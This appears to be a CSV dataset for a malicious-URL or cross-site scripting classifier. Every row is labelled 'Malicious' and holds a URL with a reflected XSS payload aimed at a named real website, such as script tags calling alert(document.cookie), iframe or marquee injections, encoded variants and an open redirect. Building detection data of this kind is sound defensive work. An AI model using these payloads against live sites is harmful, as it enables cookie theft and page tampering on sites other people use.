Sentence,Type
http://arizona.diamondbacks.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/scri<br>pt&gt;,Malicious
http://atlanta.braves.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script&gt;,Malicious
http://chicago.cubs.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script&gt;,Malicious
http://cincinnati.reds.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script&gt;,Malicious
http://colorado.rockies.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script&gt;,Malicious
http://florida.marlins.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script&gt;,Malicious
http://houston.astros.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script&gt;,Malicious
http://losangeles.dodgers.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script<br>&gt;,Malicious
http://milwaukee.brewers.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script&gt;,Malicious
http://newyork.mets.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script&gt;,Malicious
http://philadelphia.phillies.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/scr<br>ipt&gt;,Malicious
http://pittsburgh.pirates.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script<br>&gt;,Malicious
http://stlouis.cardinals.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script&gt;,Malicious
http://sandiego.padres.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script&gt;,Malicious
http://sanfrancisco.giants.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/scrip<br>t&gt;,Malicious
http://washington.nationals.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/scri<br>pt&gt;,Malicious
http://www.playlist.com/websearch?searchfor='&gt;&lt;marquee&gt;testicles was here&lt;/marquee&gt;&amp;search=search,Malicious
http://www.webmaster-talk.com/php-forum/?threadprefix=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.rhinotalk.net/forums/member-introductions/?threadprefix=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cook<br>ie);&lt;/script&gt;,Malicious
http://www.buy-host.com/forums/news-updates/?threadprefix=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/scr<br>ipt&gt;,Malicious
http://www.gamerzneeds.net/forums/news/?threadprefix=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.healthline.com/search?q1=%27%3balert(string.fromcharcode(88%2c83%2c83))%2f%2f\%27%3balert<br>(string.fromcharcode(88%2c83%2c83))%2f%2f%22%3balert(string.fromcharcode(88%2c83%2c83))%2f%2f\%22%3b<br>alert(string.fromcharcode(88%2c83%2c83))%2f%2f--%3e%3c%2fscript%3e%22%3e%27%3e%3cscript%3ealert(stri<br>ng.fromcharcode(88%2c83%2c83))%3c%2fscript%3e,Malicious
http://www.se7ensins.com/forums/xbox-360-discussion/?threadprefix=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cooki<br>e);&lt;/script&gt;,Malicious
http://www.layeredgfx.com/forums/tag-signature-tutorials/?threadprefix=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.<br>cookie);&lt;/script&gt;,Malicious
http://www.puremarketprofits.com/f233/?threadprefix=&quot;&gt;&lt;/a&gt;&lt;marquee&gt;testicles&lt;/marquee&gt;,Malicious
http://www.pc101.com/forum/f32/?threadprefix=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://search.lifespan.org/search?p=q&amp;ts=custom&amp;s_2=1&amp;w=%27);%0aalert(document.cookie);//&amp;x=0&amp;y=0,Malicious
http://www.shortnews.com/feedback.cfm?fanz=1&amp;fbid=408632&amp;rubrik=testicles&quot;&gt;&lt;script&gt;alert(document.co<br>okie);&lt;/script&gt;&amp;start=1,Malicious
http://www.enjoycg.com/forums/general/?thredprefix=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://storage.organizeit.com/search?p=q&amp;ts=custom&amp;w=&lt;/script&gt;&lt;script&gt;alert(/hacker safe my<br>ass/);&lt;/script&gt;&lt;script&gt;// &amp;restricted=mt_restricted_organizesit,Malicious
http://search.folica.com/search?p=q&amp;ts=custom&amp;isort=score&amp;w=&lt;/script&gt;&lt;script&gt;alert(/hacker safe my<br>ass/);&lt;/script&gt;&lt;script&gt;// &amp;x=0&amp;y=0,Malicious
http://qantas.resultspage.com.au/search?p=q&amp;ts=custom&amp;w=%27);%0aalert(document.cookie);//&amp;x=0&amp;y=0,Malicious
http://search.dse.com.au/search?sessionid=4859ae4304748b06273fc0a87f9c06c8&amp;w=%22%3e%3cscript%3ealert<br>(document.cookie);%3c/script%3e&amp;submit.x=0&amp;submit.y=0&amp;submit=go,Malicious
http://ccc.resultspage.com/search?s_2=1&amp;s_3=1&amp;ts=custom&amp;p=q&amp;w=%27);%0aalert(document.cookie);//&amp;x=0&amp;<br>y=0,Malicious
http://search.cableorganizer.com/search?w=%3c/script%3e%3cscript%3ealert(document.cookie);%3c/script<br>%3e%3cscript%3e//%20&amp;view=list&amp;prodsearch.x=0&amp;prodsearch.y=0&amp;prodsearch=go,Malicious
http://search.ulta.com/search?userid=guest&amp;w=%22%3e%3cscript%3ealert(%2fhacker+safe+my+ass%2f)%3b%3c<br>%2fscript%3e&amp;x=0&amp;y=0,Malicious
http://replay.tickets.com/buy/myticketsservlet?orgid=testicles&quot;&gt;&lt;script&gt;alert(document.cokie);&lt;/scri<br>pt&gt;,Malicious
http://aquaticeco.resultspage.com/search?p=q&amp;ts=custom&amp;w=%3c/script%3e%3cscript%3ealert(document.coo<br>kie);%3c/script%3e%3cscript%3e//%20&amp;x=0&amp;y=0,Malicious
http://americanbridal.resultspage.com/search?ts=custom&amp;w=%3c/script%3e%3cscript%3ealert(document.coo<br>kie);%3c/script%3e%3cscript%3e//%20&amp;x=0&amp;y=0,Malicious
http://www.miglioman.altervista.org/prova/index.php?site=forum_topic&amp;topic=1&amp;type=asc&amp;page=%22%3e%3c<br>/a%3e%3cscript%3ealert(document.cookie);%3c/script%3e%3c!--,Malicious
http://siam99.servepics.com/webpic/list.php?id=1&amp;page=1&amp;pic=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/s<br>cript&gt;,Malicious
http://forums.wingchun.com.au/academy/?thredprefix=&quot;&gt;&lt;/a&gt;&lt;marquee&gt;testicles&lt;/marquee&gt;,Malicious
http://www.cashloopholes.co.uk/gambling-loopholes-secrets/?thredprefix=&quot;&gt;&lt;/a&gt;&lt;marquee&gt;testicles&lt;/mar<br>quee&gt;,Malicious
http://www.cableforum.co.uk/board/10/?thredprefix=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.politikstube.de/forum/vorstellungen/?thredprefix=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/s<br>cript&gt;,Malicious
http://www.dhforo.com/bienvenidas/?thredprefix=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.developer-network.org/suggestions-feedback/?thredprefix=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cook<br>ie);&lt;/script&gt;,Malicious
http://www.esportboard.de/forum/ankuendigungen/?thredprefix=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/s<br>cript&gt;,Malicious
http://www.exasco.info/forum/depression/?thredprefix=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.dieselhaulin.com/forums/introduce-yourself/?thredprefix=&quot;&gt;&lt;/a&gt;&lt;marquee&gt;testicles&lt;/marquee<br>&gt;,Malicious
http://www.caraudiojunkyard.com/forum/car-audio-junkyard/?thredprefix=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.c<br>ookie);&lt;/script&gt;,Malicious
http://www.blutschwerter.de/f17-b-news/?thredprefix=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.gimnasio.ws/general/?thredprefix=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.mymodeltalk.com/jobs/modeling-acting-auditions-new-york-new-jersey/?thredprefix=&quot;&gt;&lt;/a&gt;&lt;sc<br>ript&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.shellcash.com/members/login.php?path=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.owensclickplace.com/members/login.php?path=%22%3e%3cscript%3ealert(document.cookie);%3c/s<br>cript%3e,Malicious
http://thedragonsgold.com/members/login.php?path=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.thetwodivasgpt.com/members/register.php?ref=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.girlsbazaar.com/members/login.php?path=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://cashtroops.com/members/login.php?path=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.hitmanslife.com/register.php?ref='&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.decayofcamelot.com/register.php?ref=%27%3e%3ciframe+src=http://google.com%3e,Malicious
http://www.troubledstreets.com/register.php?ref='&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.mystablemates.co.uk/register.php?ref='&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.leprechaunsloot.com/members/login.php?path=%22%3e%3cscript%3ealert(document.cookie);%3c/s<br>cript%3e,Malicious
http://www.mafiachaos.com/register.php?ref='&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.gptoffers.com/members/login.php?path=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://milkywayclicks.com/members/login.php?path=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.colossal-cash.com/members/login.php?path=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://viva-ponata.com/register.php?ref='&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.intoffers.com/members/login.php?path=%22%3e%3cscript%3ealert(document.cookie);%3c/script%<br>3e,Malicious
http://www.riseofterror.com/register.php?ref=&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://pocketchangegpt.com/members/login.php?path=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.race4clicks.com/members/login.php?path=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.grandtheftmastermind.com/register.php?ref=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.piratequests.com/register.php?ref=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.starreferrals.com/members/login.php?path=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.hostile-city.com/register.php?ref='&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.squishycash.com/members/login.php?path=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.jillsclickcorner.com/members/login.php?path=%22%3e%3cscript%3ealert(document.cookie);%3c/<br>script%3e,Malicious
http://ozgonewild.com/register.php?ref=%27%3e%3cscript%3ealert(document.cookie);%3c/script%3e,Malicious
http://firehouseoffers.com/members/register.php?ref=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://firehouseoffers.com/members/login.php?path=%22%3e%3cscript%3ealert(document.cookie);%3c/scrip<br>t%3e,Malicious
http://piratesriches.com/members/login.php?path=%22%3e%3cscript%3ealert(document.cookie);%3c/script%<br>3e,Malicious
http://www.mafia3000.com/register.php?ref=%27%3e%3cscript%3ealert(document.cookie);%3c/script%3e,Malicious
http://www.bowlingforcash.com/members/login.php?path=%22%3e%3cscript%3ealert(document.cookie);%3c/sc<br>ript%3e,Malicious
http://www.gptcashcow.com/members/login.php?path=%22%3e%3cscript%3ealert(document.cookie);%3c/script<br>%3e,Malicious
http://www.dazzleindough.com/members/login.php?path=%22%3e%3cscript%3ealert(document.cookie);%3c/scr<br>ipt%3e,Malicious
http://www.myepisodes.com/login.php?u=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://ready-up.com/main/community/f6/?threadprefix=&quot;&gt;&lt;/a&gt;&lt;marquee&gt;pappy_was_here&lt;/marquee&gt;%3cscript%3ealert(document.cookie);%<br>3c/script%3e,Malicious
http://www.stop-sign.com/se/se332b.php?pg=%22%3e%3c/a%3etesticles&amp;ver=%22%3e%3c/a%3etesticles&amp;n=%22%<br>3e%3c/a%3etesticles&amp;uid=%22%3e%3c/a%3e%3cscript%3ealert(document.cookie);%3c/script%3e&amp;bit_mask=0&amp;bi<br>t_sample=780508868&amp;sv=mss_spin_mss_spin,Malicious
http://freebiesjunction.com/members/login.php?path=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://investors.cray.com/phoenix.zhtml?c=98390&amp;p=irol-newsarticle&amp;id=1136684&amp;highlight=%22%3etestic<br>les%3c/a%3etest%3cmarquee%3epappy was here%3c/marquee%3e,Malicious
http://www.kinkom.by/search.php?cat=&amp;query=%3cscript%3ealert(document.cookie);%3c/script%3e,Malicious
http://dailytimesuck.com/search.php?search=%22%3e%3ciframe+src=http://google.com?&amp;searchelement=both,Malicious
http://www.themotorhouse.co.uk/register/?ref=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://bankrollbucks.com/members/login.php?path=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.thedjlist.com/login.php?scen=a%3a1%3a{i%3a0%3bi%3a75%3b}&amp;ref='&gt;&lt;script&gt;alert(document.coo<br>kie);&lt;/script&gt;,Malicious
http://www.gulftalent.com/home/canpositions-viewlist-s.php?currentpage=3&amp;recordsperpage=25&amp;name_flag<br>=&amp;from_search=true&amp;jobcat=&amp;industry=22&amp;seniority=&amp;frmpositioncountry=&amp;pastdate=&amp;from_possearch=&amp;pos_<br>ref=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.wehire.ca/personal.php?action=new&amp;auth_sess=e757d8719f17c4c88c41344fc1107ef6&amp;ref=&quot;&gt;&lt;scrip<br>t&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.jobgeo.com/personal.php?action=new&amp;auth_sess=&amp;ref=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/scri<br>pt&gt;,Malicious
http://r.espn.go.com/espn/preferences/passivelogin?appredirect=http://google.com,Malicious
http://www.commonsensemedia.org/user/register.php?fwd=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.seven-bux.com/index.php?view=login&amp;ref=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.jtpappys.com/products.php?cat=7%22%3e%3cscript%3ealert(document.cookie);%3c/script%3e,Malicious
http://www.mycricket.com/cricketsupport/faqs/details?id=529&amp;fromsearch=%22%3e%3c/a%3e%3cscript%3eale<br>rt(/hacker%20safe%20my%20ass/);%3c/script%3e,Malicious
http://www.4x4mecca.com/forum/tech-tuesdays/?thredprefix=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/scri<br>pt&gt;,Malicious
http://www.directory.wiredawg.net/index.php?q=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://visitlasvegas.com/vegas/my-vegas/login.jsp?email=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www2.fuse.tv/login.php?ref=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www2.fuse.tv/search.php?searchstring=&lt;script&gt;alert(document.cookie);&lt;/script&gt;&amp;x=0&amp;y=0,Malicious
http://usa.kaspersky.com/trials/trialsreg.php?aw=trials+page&amp;ref=&quot;&gt;&lt;script&gt;alert(&quot;so anti-virus cant<br>secure their pages?&quot;);&lt;/script&gt;&amp;chapter=146538207,Malicious
http://www.cash2grab.com/members/login.php?path=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.globalcashclicks.com/members/login.php?path=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.eetimes.com/techsearch/not_found.jhtml;jsessionid=fpyiswcussjkqqsndlpckh0cjunn2jvn?nftype<br>=empty&amp;querytext=%22%3b+alert%28document.cookie%29%3b%2f%2f&amp;site_id=ee+times&amp;_requestid=212632,Malicious
http://www.5centminimum.com/members/login.php?path=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.ticketcenter.com/sendpage/friend.php?id=&quot;&gt;&lt;marquee&gt;%3cscript%3ealert(document.cookie);%<br>3c/script%3esome concert tickets&lt;/marquee&gt;,Malicious
http://www.hexar.net/viewfile.php?/&lt;/title&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.mlgpro.com/?q=node/219283&amp;page=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;&amp;query=node/<br>219283,Malicious
http://wow.maxvellnos.com/register.php?ref='&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.wiredawg.net/mail.asp?source=locator&amp;personid=2757&amp;name=&lt;script&gt;alert(document.cookie);&lt;/<br>script&gt;,Malicious
http://www.localschooldirectory.com/include/information/az/category_2/aims_chart.php?district_page=y<br>&amp;state_page=y&amp;subject=&lt;/title&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;&amp;grade=grade,Malicious
http://api.msappspace.com/proxy/relay.proxy?opensocial_authtype=signed&amp;opensocial_token=at4ijkeddpnl<br>kau5f/gsmgfqlodup0edptea45xouklxsvujcvgcams+blrbo8m3617chfi29vffwitjqsbfr3rlryrivuzjlk2v2b+fcua=&amp;ope<br>nsocial_url=http://xssed.com,Malicious
http://www.centralchat.net/chatrooms/cgiirc.php?c=&lt;/title&gt;&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.totalbeauty.com/index.php?swords=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;&amp;x=0&amp;y=0&amp;id=51<br>&amp;no_cache=1,Malicious
http://hotlists.hotornot.com/style-g961172-heroes.html?rid=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script<br>&gt;,Malicious
http://hotlists.hotornot.com/?state=embed&amp;wid=nlosgzel&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;&amp;aut<br>htoken=undefined&amp;username=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://hotlists.hotornot.com/?state=browse&amp;tag=boobs&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.universalcriminal.com/register.php?ref='&gt;&lt;iframe+src=http://google.com&gt;,Malicious
http://www.warriorsreign.com/register.php?ref='&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.torn-county.net/register.php?ref='&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.haunted-horrors.com/register2.php?ref='&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.downtown-to.com/register.php?ref='&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.video-game-rpg.com/register.php?ref=1'&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://suburban-assault.com/register.php?ref='&gt;&lt;iframe+src=http://google.com&gt;,Malicious
http://www.daysofprohibition.com/register.php?ref='&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.brokencriminals.com/register.php?ref='&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://trapped-in-paradise.com/register.php?ref='&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.criminaldevastation.com/register.php?ref=1'&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://corruptedcity.net/register.php?ref=1'&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.bogansandbitches.com/register.php?ref=1'&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.unholystate.com/register.php?ref='&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.pimpstreetwars.com/signup.php?ref=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://la-familia.nl/register.php?ref=&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://www.ultimateoutdoorz.com/register.php?ref=1'&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://wanted-criminals.net/register.php?ref=1'&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious
